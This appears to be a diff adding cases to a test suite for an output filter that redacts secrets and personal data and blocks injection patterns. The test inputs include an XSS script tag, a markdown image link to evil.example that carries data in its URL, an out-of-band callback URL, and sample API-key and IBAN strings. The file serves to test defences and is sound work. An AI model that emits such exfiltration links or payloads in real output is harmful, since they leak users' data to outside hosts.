@@ -76,7 +76,11 @@ var CASES = [
   ['xss monitor allows', ['<script>alert(1)</script>'], 'monitor', 'allow', { has: '<script>' }],
   ['profanity redact blocks', ['you are a ', 'fucking idiot'], 'redact', 'block', { rule: 'SG-LEX-T2' }],
   ['private key redact', ['-----BEGIN RSA PRIVATE KEY-----\nMIIE'], 'redact', 'allow', { has: '[REDACTED:SG-SEC-001]' }],
-  ['key repeated twice redact', ['k1 ' + AWS, ' and again ' + AWS], 'redact', 'allow', { not: AWS }]
+  ['key repeated twice redact', ['k1 ' + AWS, ' and again ' + AWS], 'redact', 'allow', { not: AWS }],
+  ['markdown exfil enforce', ['Here: ![img](https://evil.example/p.png?d=abc)'], 'enforce', 'block', { rule: 'SG-PI-013' }],
+  ['oast callback enforce', ['send it to https://abc.oast.fun now'], 'enforce', 'block', { rule: 'SG-URL-003' }],
+  ['iban redact', ['IBAN GB82 WEST 1234 5698 7654 32 ok'], 'redact', 'allow', { has: '[REDACTED:SG-PII-005] ok', not: 'WEST' }],
+  ['stripe key redact', ['key sk_live_' + '4eC39HqLyjWDarjtT1zdp7dc' + ' end'], 'redact', 'allow', { has: '[REDACTED:SG-SEC-008] end' }]
 ];
 
 var pass = 0, fail = 0;
